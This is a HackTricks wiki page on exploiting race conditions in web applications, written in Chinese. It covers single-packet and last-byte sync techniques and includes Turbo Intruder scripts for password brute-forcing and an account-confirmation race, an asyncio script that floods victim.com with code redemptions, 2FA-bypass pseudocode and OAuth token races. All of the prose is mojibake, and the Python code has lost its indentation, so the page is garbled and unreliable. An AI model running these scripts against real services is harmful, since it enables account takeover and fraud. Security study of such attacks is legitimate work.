# ç«äº‰æ¡ä»¶

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) å¯è½»æ¾æ„å»ºå’Œ **è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œä½¿ç”¨å…¨çƒ **æœ€å…ˆè¿›** çš„ç¤¾åŒºå·¥å…·ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS çº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„ **å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ PDF ç‰ˆæœ¬çš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢ [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶ [**NFT**](https://opensea.io/collection/the-peass-family) æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘ **HackTricks** å’Œ **HackTricks Cloud** çš„ github ä»“åº“æäº¤ PR æ¥ **åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

{% hint style="warning" %}
è¦æ·±å…¥äº†è§£æ­¤æŠ€æœ¯ï¼Œè¯·æŸ¥çœ‹åŸå§‹æŠ¥å‘Š [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
{% endhint %}

## åŠ å¼ºç«äº‰æ¡ä»¶æ”»å‡»

åˆ©ç”¨ç«äº‰æ¡ä»¶çš„ä¸»è¦éšœç¢æ˜¯ç¡®ä¿å¤šä¸ªè¯·æ±‚åŒæ—¶å¤„ç†ï¼Œä¸”å®ƒä»¬çš„å¤„ç†æ—¶é—´**å‡ ä¹æ²¡æœ‰å·®å¼‚â€”æœ€å¥½å°äº 1 æ¯«ç§’**ã€‚

ä»¥ä¸‹æ˜¯ä¸€äº›åŒæ­¥è¯·æ±‚çš„æŠ€æœ¯ï¼š

#### HTTP/2 å•æ•°æ®åŒ…æ”»å‡» vs. HTTP/1.1 æœ€åå­—èŠ‚åŒæ­¥

- **HTTP/2**ï¼šæ”¯æŒé€šè¿‡å•ä¸ª TCP è¿æ¥å‘é€ä¸¤ä¸ªè¯·æ±‚ï¼Œå‡å°‘ç½‘ç»œæŠ–åŠ¨çš„å½±å“ã€‚ç„¶è€Œï¼Œç”±äºæœåŠ¡å™¨ç«¯çš„å˜åŒ–ï¼Œä¸¤ä¸ªè¯·æ±‚å¯èƒ½ä¸è¶³ä»¥å®ç°ä¸€è‡´çš„ç«äº‰æ¡ä»¶åˆ©ç”¨ã€‚
- **HTTP/1.1 'æœ€åå­—èŠ‚åŒæ­¥'**ï¼šå…è®¸é¢„å…ˆå‘é€å¤§éƒ¨åˆ† 20-30 ä¸ªè¯·æ±‚çš„å†…å®¹ï¼Œä¿ç•™ä¸€ä¸ªå°ç‰‡æ®µï¼Œç„¶åä¸€èµ·å‘é€ï¼Œå®ç°åŒæ—¶åˆ°è¾¾æœåŠ¡å™¨ã€‚

**å‡†å¤‡è¿›è¡Œæœ€åå­—èŠ‚åŒæ­¥** åŒ…æ‹¬ï¼š
1. å‘é€æ ‡é¢˜å’Œä¸»ä½“æ•°æ®ï¼Œä½†ä¸åŒ…æ‹¬æœ€åä¸€ä¸ªå­—èŠ‚ï¼Œä¸ç»“æŸæµã€‚
2. åˆå§‹å‘é€åæš‚åœ 100 æ¯«ç§’ã€‚
3. ç¦ç”¨ TCP_NODELAY ä»¥åˆ©ç”¨ Nagle ç®—æ³•æ‰¹å¤„ç†æœ€ç»ˆå¸§ã€‚
4. å‘é€ ping ä»¥çƒ­èº«è¿æ¥ã€‚

éšåå‘é€è¢«ä¿ç•™çš„å¸§åº”å¯¼è‡´å®ƒä»¬ä»¥å•ä¸ªæ•°æ®åŒ…åˆ°è¾¾ï¼Œå¯é€šè¿‡ Wireshark è¿›è¡ŒéªŒè¯ã€‚æ­¤æ–¹æ³•ä¸é€‚ç”¨äºé€šå¸¸ä¸æ¶‰åŠç«äº‰æ¡ä»¶æ”»å‡»çš„é™æ€æ–‡ä»¶ã€‚

### é€‚åº”æœåŠ¡å™¨æ¶æ„

äº†è§£ç›®æ ‡çš„æ¶æ„è‡³å…³é‡è¦ã€‚å‰ç«¯æœåŠ¡å™¨å¯èƒ½ä¼šä»¥ä¸åŒæ–¹å¼è·¯ç”±è¯·æ±‚ï¼Œå½±å“æ—¶é—´ã€‚é€šè¿‡æ— å…³ç´§è¦çš„è¯·æ±‚è¿›è¡Œé¢„å…ˆçš„æœåŠ¡å™¨ç«¯è¿æ¥çƒ­èº«ï¼Œå¯èƒ½ä¼šä½¿è¯·æ±‚æ—¶é—´æ­£å¸¸åŒ–ã€‚

#### å¤„ç†åŸºäºä¼šè¯çš„é”å®š

åƒ PHP çš„ä¼šè¯å¤„ç†ç¨‹åºä¼šæ ¹æ®ä¼šè¯å¯¹è¯·æ±‚è¿›è¡Œåºåˆ—åŒ–ï¼Œå¯èƒ½ä¼šéšè—æ¼æ´ã€‚ä¸ºæ¯ä¸ªè¯·æ±‚ä½¿ç”¨ä¸åŒçš„ä¼šè¯ä»¤ç‰Œå¯ä»¥è§„é¿æ­¤é—®é¢˜ã€‚

#### å…‹æœé€Ÿç‡æˆ–èµ„æºé™åˆ¶

å¦‚æœè¿æ¥çƒ­èº«æ— æ•ˆï¼Œé€šè¿‡æ•…æ„è§¦å‘ Web æœåŠ¡å™¨çš„é€Ÿç‡æˆ–èµ„æºé™åˆ¶å»¶è¿Ÿï¼Œé€šè¿‡æ´ªæ°´å¼çš„è™šæ‹Ÿè¯·æ±‚å¯èƒ½ä¼šä¿ƒè¿›å•æ•°æ®åŒ…æ”»å‡»ï¼Œå¼•å‘æœ‰åˆ©äºç«äº‰æ¡ä»¶çš„æœåŠ¡å™¨ç«¯å»¶è¿Ÿã€‚

## æ”»å‡»ç¤ºä¾‹

* **Tubo Intruder - HTTP2 å•æ•°æ®åŒ…æ”»å‡»ï¼ˆ1 ä¸ªç«¯ç‚¹ï¼‰**ï¼šæ‚¨å¯ä»¥å°†è¯·æ±‚å‘é€åˆ° **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`)ï¼Œæ‚¨å¯ä»¥æ›´æ”¹è¯·æ±‚ä¸­è¦æš´åŠ›ç ´è§£çš„å€¼ä¸º **`%s`**ï¼Œå¦‚ `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s`ï¼Œç„¶åä»ä¸‹æ‹‰èœå•ä¸­é€‰æ‹© **`examples/race-single-packer-attack.py`**ï¼š

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

å¦‚æœæ‚¨è¦**å‘é€ä¸åŒçš„å€¼**ï¼Œæ‚¨å¯ä»¥ä¿®æ”¹ä»£ç ï¼Œä½¿ç”¨ä»å‰ªè´´æ¿ä¸­è·å–çš„å•è¯åˆ—è¡¨ã€‚
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
{% hint style="warning" %}
å¦‚æœç½‘ç«™ä¸æ”¯æŒHTTP2ï¼ˆä»…æ”¯æŒHTTP1.1ï¼‰ï¼Œè¯·ä½¿ç”¨`Engine.THREADED`æˆ–`Engine.BURP`ï¼Œè€Œä¸æ˜¯`Engine.BURP2`ã€‚
{% endhint %}

* **Tubo Intruder - HTTP2å•æ•°æ®åŒ…æ”»å‡»ï¼ˆå¤šä¸ªç«¯ç‚¹ï¼‰**ï¼šå¦‚æœæ‚¨éœ€è¦å‘ä¸€ä¸ªç«¯ç‚¹å‘é€è¯·æ±‚ï¼Œç„¶åå‘å…¶ä»–ç«¯ç‚¹å‘é€å¤šä¸ªè¯·æ±‚ä»¥è§¦å‘RCEï¼Œæ‚¨å¯ä»¥ä¿®æ”¹`race-single-packet-attack.py`è„šæœ¬ï¼Œç±»ä¼¼äºï¼š
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
* åœ¨Burp Suiteçš„**Repeater**ä¸­ï¼Œè¿˜å¯ä»¥é€šè¿‡æ–°çš„**å¹¶è¡Œå‘é€ç»„**é€‰é¡¹ä½¿ç”¨ã€‚
* å¯¹äº**limit-overrun**ï¼Œæ‚¨å¯ä»¥åœ¨ç»„ä¸­**æ·»åŠ ç›¸åŒè¯·æ±‚50æ¬¡**ã€‚
* å¯¹äº**è¿æ¥é¢„çƒ­**ï¼Œæ‚¨å¯ä»¥åœ¨ç»„çš„**å¼€å¤´**æ·»åŠ ä¸€äº›è¯·æ±‚åˆ°WebæœåŠ¡å™¨çš„éé™æ€éƒ¨åˆ†ã€‚
* è¦**å»¶è¿Ÿ**å¤„ç†**ä¸€ä¸ªè¯·æ±‚å’Œå¦ä¸€ä¸ªè¯·æ±‚ä¹‹é—´**çš„è¿‡ç¨‹ï¼Œåœ¨2ä¸ªå­çŠ¶æ€æ­¥éª¤ä¸­ï¼Œæ‚¨å¯ä»¥åœ¨è¿™ä¸¤ä¸ªè¯·æ±‚ä¹‹é—´**æ·»åŠ é¢å¤–çš„è¯·æ±‚**ã€‚
* å¯¹äº**å¤šç«¯ç‚¹**çš„RCï¼Œæ‚¨å¯ä»¥å¼€å§‹å‘é€**è¿›å…¥éšè—çŠ¶æ€çš„è¯·æ±‚**ï¼Œç„¶ååœ¨å…¶å**ç«‹å³å‘é€50ä¸ªåˆ©ç”¨éšè—çŠ¶æ€çš„è¯·æ±‚**ã€‚

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### åŸå§‹BF

åœ¨è¿›è¡Œä¸Šè¿°ç ”ç©¶ä¹‹å‰ï¼Œè¿™äº›æ˜¯ä¸€äº›ç”¨äºå°è¯•å°½å¿«å‘é€æ•°æ®åŒ…ä»¥å¼•å‘RCçš„æœ‰æ•ˆè½½è·ã€‚

* **Repeaterï¼š**è¯·æŸ¥çœ‹å‰ä¸€èŠ‚ä¸­çš„ç¤ºä¾‹ã€‚
* **Intruderï¼š**å°†**è¯·æ±‚**å‘é€åˆ°**Intruder**ï¼Œåœ¨**é€‰é¡¹èœå•**ä¸­å°†**çº¿ç¨‹æ•°**è®¾ç½®ä¸º**30**ï¼Œé€‰æ‹©**ç©ºæœ‰æ•ˆè½½è·**ä½œä¸ºæœ‰æ•ˆè½½è·å¹¶ç”Ÿæˆ**30**ã€‚
* **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
* **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodology**

### é™åˆ¶è¶…é™ / TOCTOU

è¿™æ˜¯æœ€åŸºæœ¬çš„ä¸€ç§ç«äº‰æ¡ä»¶ï¼Œå…¶ä¸­**æ¼æ´**å‡ºç°åœ¨**é™åˆ¶æ‰§è¡ŒæŸä¸ªæ“ä½œæ¬¡æ•°çš„åœ°æ–¹**ã€‚æ¯”å¦‚åœ¨ç½‘åº—å¤šæ¬¡ä½¿ç”¨ç›¸åŒçš„æŠ˜æ‰£ä»£ç ã€‚ä¸€ä¸ªéå¸¸ç®€å•çš„ä¾‹å­å¯ä»¥åœ¨[**è¿™ä»½æŠ¥å‘Š**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43)æˆ–[**è¿™ä¸ªæ¼æ´**](https://hackerone.com/reports/759247)**ä¸­æ‰¾åˆ°**ã€‚

è¿™ç§æ”»å‡»æœ‰è®¸å¤šå˜ç§ï¼ŒåŒ…æ‹¬ï¼š

* å¤šæ¬¡å…‘æ¢ç¤¼å“å¡
* å¤šæ¬¡è¯„ä»·äº§å“
* è¶…å‡ºè´¦æˆ·ä½™é¢æå–æˆ–è½¬è´¦ç°é‡‘
* é‡å¤ä½¿ç”¨å•ä¸ªéªŒè¯ç è§£å†³æ–¹æ¡ˆ
* ç»•è¿‡åæš´åŠ›ç ´è§£é€Ÿç‡é™åˆ¶

### **éšè—å­çŠ¶æ€**

åˆ©ç”¨å¤æ‚çš„ç«äº‰æ¡ä»¶é€šå¸¸æ¶‰åŠåˆ©ç”¨ä¸éšè—æˆ–**æ„å¤–çš„æœºå™¨å­çŠ¶æ€**äº¤äº’çš„çŸ­æš‚æœºä¼šã€‚ä»¥ä¸‹æ˜¯å¤„ç†æ­¤ç±»æƒ…å†µçš„æ–¹æ³•ï¼š

1. **è¯†åˆ«æ½œåœ¨çš„éšè—å­çŠ¶æ€**
- é¦–å…ˆï¼Œç¡®å®šä¿®æ”¹æˆ–ä¸å…³é”®æ•°æ®äº¤äº’çš„ç«¯ç‚¹ï¼Œå¦‚ç”¨æˆ·é…ç½®æ–‡ä»¶æˆ–å¯†ç é‡ç½®æµç¨‹ã€‚å…³æ³¨ï¼š
- **å­˜å‚¨**ï¼šä¼˜å…ˆé€‰æ‹©å¤„ç†æœåŠ¡å™¨ç«¯æŒä¹…æ•°æ®çš„ç«¯ç‚¹ï¼Œè€Œä¸æ˜¯å¤„ç†å®¢æˆ·ç«¯æ•°æ®çš„ç«¯ç‚¹ã€‚
- **æ“ä½œ**ï¼šå¯»æ‰¾ä¿®æ”¹ç°æœ‰æ•°æ®çš„æ“ä½œï¼Œè¿™äº›æ“ä½œæ›´æœ‰å¯èƒ½åˆ›å»ºå¯åˆ©ç”¨çš„æ¡ä»¶ï¼Œè€Œä¸æ˜¯æ·»åŠ æ–°æ•°æ®çš„æ“ä½œã€‚
- **é”®å…¥**ï¼šæˆåŠŸçš„æ”»å‡»é€šå¸¸æ¶‰åŠä½¿ç”¨ç›¸åŒæ ‡è¯†ç¬¦ï¼ˆä¾‹å¦‚ç”¨æˆ·åæˆ–é‡ç½®ä»¤ç‰Œï¼‰çš„æ“ä½œã€‚

2. **è¿›è¡Œåˆå§‹æ¢æµ‹**
- ä½¿ç”¨ç«äº‰æ¡ä»¶æ”»å‡»æµ‹è¯•å·²è¯†åˆ«çš„ç«¯ç‚¹ï¼Œè§‚å¯Ÿæ˜¯å¦æœ‰ä¸é¢„æœŸç»“æœä¸ç¬¦çš„æƒ…å†µã€‚æ„å¤–çš„å“åº”æˆ–åº”ç”¨è¡Œä¸ºçš„å˜åŒ–å¯èƒ½è¡¨æ˜å­˜åœ¨æ¼æ´ã€‚

3. **å±•ç¤ºæ¼æ´**
- å°†æ”»å‡»èŒƒå›´ç¼©å°åˆ°åˆ©ç”¨æ¼æ´æ‰€éœ€çš„æœ€å°‘è¯·æ±‚æ•°ï¼Œé€šå¸¸ä»…ä¸ºä¸¤ä¸ªã€‚ç”±äºæ¶‰åŠç²¾ç¡®çš„æ—¶é—´ï¼Œè¿™ä¸€æ­¥å¯èƒ½éœ€è¦å¤šæ¬¡å°è¯•æˆ–è‡ªåŠ¨åŒ–ã€‚

### æ—¶é—´æ•æ„Ÿæ”»å‡»

åœ¨å®šæ—¶è¯·æ±‚æ–¹é¢çš„ç²¾ç¡®æ€§å¯ä»¥æ­ç¤ºæ¼æ´ï¼Œç‰¹åˆ«æ˜¯åœ¨å®‰å…¨ä»¤ç‰Œä½¿ç”¨å¯é¢„æµ‹çš„æ–¹æ³•ï¼ˆå¦‚æ—¶é—´æˆ³ï¼‰æ—¶ã€‚ä¾‹å¦‚ï¼ŒåŸºäºæ—¶é—´æˆ³ç”Ÿæˆå¯†ç é‡ç½®ä»¤ç‰Œå¯èƒ½å…è®¸åŒæ—¶è¯·æ±‚ç›¸åŒçš„ä»¤ç‰Œã€‚

**åˆ©ç”¨ï¼š**
- ä½¿ç”¨ç²¾ç¡®çš„æ—¶é—´ï¼Œå¦‚å•ä¸ªæ•°æ®åŒ…æ”»å‡»ï¼Œè¿›è¡Œå¹¶å‘å¯†ç é‡ç½®è¯·æ±‚ã€‚ç›¸åŒçš„ä»¤ç‰Œè¡¨æ˜å­˜åœ¨æ¼æ´ã€‚

**ç¤ºä¾‹ï¼š**
- åŒæ—¶è¯·æ±‚ä¸¤ä¸ªå¯†ç é‡ç½®ä»¤ç‰Œå¹¶è¿›è¡Œæ¯”è¾ƒã€‚åŒ¹é…çš„ä»¤ç‰Œè¡¨æ˜ä»¤ç‰Œç”Ÿæˆå­˜åœ¨ç¼ºé™·ã€‚

**æŸ¥çœ‹è¿™ä¸ª[PortSwiggerå®éªŒå®¤](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities)æ¥å°è¯•ã€‚**


## éšè—å­çŠ¶æ€æ¡ˆä¾‹ç ”ç©¶

### æ”¯ä»˜å¹¶æ·»åŠ å•†å“

æŸ¥çœ‹è¿™ä¸ª[**PortSwiggerå®éªŒå®¤**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation)ä»¥äº†è§£å¦‚ä½•åœ¨å•†åº—ä¸­**æ”¯ä»˜**å¹¶**æ·»åŠ é¢å¤–**çš„å•†å“ï¼Œè€Œ**æ— éœ€ä¸ºå…¶ä»˜æ¬¾**ã€‚

### ç¡®è®¤å…¶ä»–ç”µå­é‚®ä»¶

è¿™ä¸ªæƒ³æ³•æ˜¯**åŒæ—¶éªŒè¯ä¸€ä¸ªç”µå­é‚®ä»¶åœ°å€å¹¶å°†å…¶æ›´æ”¹ä¸ºå¦ä¸€ä¸ª**ï¼Œä»¥æŸ¥æ˜å¹³å°æ˜¯å¦éªŒè¯äº†æ›´æ”¹åçš„æ–°ç”µå­é‚®ä»¶ã€‚

### å°†ç”µå­é‚®ä»¶æ›´æ”¹ä¸º2ä¸ªç”µå­é‚®ä»¶åœ°å€åŸºäºCookie

æ ¹æ®[**è¿™é¡¹ç ”ç©¶**](https://portswigger.net/research/smashing-the-state-machine)ï¼ŒGitlabå®¹æ˜“å—åˆ°è¿™ç§æ–¹å¼çš„æ¥ç®¡æ”»å‡»ï¼Œå› ä¸ºå®ƒå¯èƒ½ä¼š**å°†ä¸€ä¸ªç”µå­é‚®ä»¶çš„ç”µå­é‚®ä»¶éªŒè¯ä»¤ç‰Œå‘é€åˆ°å¦ä¸€ä¸ªç”µå­é‚®ä»¶**ã€‚

**æŸ¥çœ‹è¿™ä¸ª[PortSwiggerå®éªŒå®¤](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint)æ¥å°è¯•ã€‚**

### éšè—æ•°æ®åº“çŠ¶æ€ / ç¡®è®¤ç»•è¿‡

å¦‚æœä½¿ç”¨**2ä¸ªä¸åŒçš„å†™å…¥**æ¥**å‘æ•°æ®åº“ä¸­æ·»åŠ ä¿¡æ¯**ï¼Œé‚£ä¹ˆåœ¨**åªæœ‰ç¬¬ä¸€ä¸ªæ•°æ®å·²å†™å…¥**æ•°æ®åº“çš„ä¸€å°æ®µæ—¶é—´å†…ã€‚ä¾‹å¦‚ï¼Œåˆ›å»ºç”¨æˆ·æ—¶**ç”¨æˆ·å**å’Œ**å¯†ç **å¯èƒ½ä¼šè¢«**å†™å…¥**ï¼Œç„¶åå†™å…¥ç”¨äºç¡®è®¤æ–°åˆ›å»ºå¸æˆ·çš„ä»¤ç‰Œã€‚è¿™æ„å‘³ç€åœ¨çŸ­æ—¶é—´å†…**ç”¨äºç¡®è®¤å¸æˆ·çš„ä»¤ç‰Œä¸ºç©º**ã€‚

å› æ­¤ï¼Œ**æ³¨å†Œä¸€ä¸ªå¸æˆ·å¹¶å‘é€å¤šä¸ªå¸¦æœ‰ç©ºä»¤ç‰Œçš„è¯·æ±‚**ï¼ˆ`token=`æˆ–`token[]=`æˆ–ä»»ä½•å…¶ä»–å˜ä½“ï¼‰ç«‹å³ç¡®è®¤å¸æˆ·å¯èƒ½å…è®¸**ç¡®è®¤ä¸€ä¸ªæ‚¨æ— æ³•æ§åˆ¶ç”µå­é‚®ä»¶çš„å¸æˆ·**ã€‚

**æŸ¥çœ‹è¿™ä¸ª[PortSwiggerå®éªŒå®¤](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction)æ¥å°è¯•ã€‚**

### ç»•è¿‡2FA

ä»¥ä¸‹ä¼ªä»£ç å®¹æ˜“å—åˆ°ç«äº‰æ¡ä»¶æ”»å‡»çš„å½±å“ï¼Œå› ä¸ºåœ¨éå¸¸çŸ­çš„æ—¶é—´å†…**2FAæœªè¢«å¼ºåˆ¶æ‰§è¡Œ**è€Œä¼šåˆ›å»ºä¼šè¯ï¼š
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2æ°¸ä¹…æ€§æŒä¹…æ€§

æœ‰å‡ ä¸ª[**OAuthæä¾›è€…**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers)ã€‚è¿™äº›æœåŠ¡å°†å…è®¸æ‚¨åˆ›å»ºä¸€ä¸ªåº”ç”¨ç¨‹åºå¹¶å¯¹æä¾›è€…å·²æ³¨å†Œçš„ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯ã€‚ä¸ºäº†åšåˆ°è¿™ä¸€ç‚¹ï¼Œ**å®¢æˆ·ç«¯**å°†éœ€è¦**å…è®¸æ‚¨çš„åº”ç”¨ç¨‹åº**è®¿é—®**OAuthæä¾›è€…**å†…éƒ¨çš„ä¸€äº›æ•°æ®ã€‚\
å› æ­¤ï¼Œç›´åˆ°è¿™é‡Œåªæ˜¯ä¸€ä¸ªå¸¸è§çš„ä½¿ç”¨google/linkedin/githubç­‰ç™»å½•ï¼Œæ‚¨ä¼šçœ‹åˆ°ä¸€ä¸ªé¡µé¢ï¼Œä¸Šé¢å†™ç€ï¼šâ€œ_åº”ç”¨ç¨‹åº\<InsertCoolName>æƒ³è¦è®¿é—®æ‚¨çš„ä¿¡æ¯ï¼Œæ‚¨æ˜¯å¦è¦å…è®¸ï¼Ÿ_â€

#### `authorization_code`ä¸­çš„ç«äº‰æ¡ä»¶

**é—®é¢˜**å‡ºç°åœ¨æ‚¨**æ¥å—**å¹¶è‡ªåŠ¨å‘æ¶æ„åº”ç”¨ç¨‹åºå‘é€**`authorization_code`**æ—¶ã€‚ç„¶åï¼Œæ­¤**åº”ç”¨ç¨‹åºæ»¥ç”¨OAuthæœåŠ¡æä¾›å•†ä¸­çš„ç«äº‰æ¡ä»¶ï¼Œä»`authorization_code`ç”Ÿæˆå¤šä¸ªAT/RT**ï¼ˆ_è®¤è¯ä»¤ç‰Œ/åˆ·æ–°ä»¤ç‰Œ_ï¼‰ç”¨äºæ‚¨çš„å¸æˆ·ã€‚åŸºæœ¬ä¸Šï¼Œå®ƒå°†æ»¥ç”¨æ‚¨å·²ç»å…è®¸è¯¥åº”ç”¨ç¨‹åºè®¿é—®æ‚¨çš„æ•°æ®çš„äº‹å®æ¥**åˆ›å»ºå¤šä¸ªå¸æˆ·**ã€‚ç„¶åï¼Œå¦‚æœæ‚¨**åœæ­¢å…è®¸è¯¥åº”ç”¨ç¨‹åºè®¿é—®æ‚¨çš„æ•°æ®ï¼Œä¸€ä¸ªAT/RTå¯¹å°†è¢«åˆ é™¤ï¼Œä½†å…¶ä»–å¯¹ä»å°†æœ‰æ•ˆ**ã€‚

#### `Refresh Token`ä¸­çš„ç«äº‰æ¡ä»¶

ä¸€æ—¦æ‚¨**è·å¾—äº†æœ‰æ•ˆçš„RT**ï¼Œæ‚¨å¯ä»¥å°è¯•**æ»¥ç”¨å®ƒæ¥ç”Ÿæˆå¤šä¸ªAT/RT**ï¼Œå³ä½¿ç”¨æˆ·å–æ¶ˆäº†æ¶æ„åº”ç”¨ç¨‹åºè®¿é—®å…¶æ•°æ®çš„æƒé™ï¼Œ**å¤šä¸ªRTä»å°†æœ‰æ•ˆ**ã€‚

## **WebSocketsä¸­çš„RC**

åœ¨[**WS\_RaceCondition\_PoC**](https://github.com/redrays-io/WS\_RaceCondition\_PoC)ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªJava PoCï¼Œç”¨äº**å¹¶è¡Œ**å‘é€websocketæ¶ˆæ¯ä»¥æ»¥ç”¨**WebSocketsä¸­çš„ç«äº‰æ¡ä»¶**ã€‚

## å‚è€ƒèµ„æ–™

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
* [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
* [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASSï¼†HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS Family**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ä¸Šå…³æ³¨**æˆ‘ä»¬ã€‚
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)å¯ä»¥è½»æ¾æ„å»ºå’Œ**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œä½¿ç”¨ä¸–ç•Œä¸Š**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
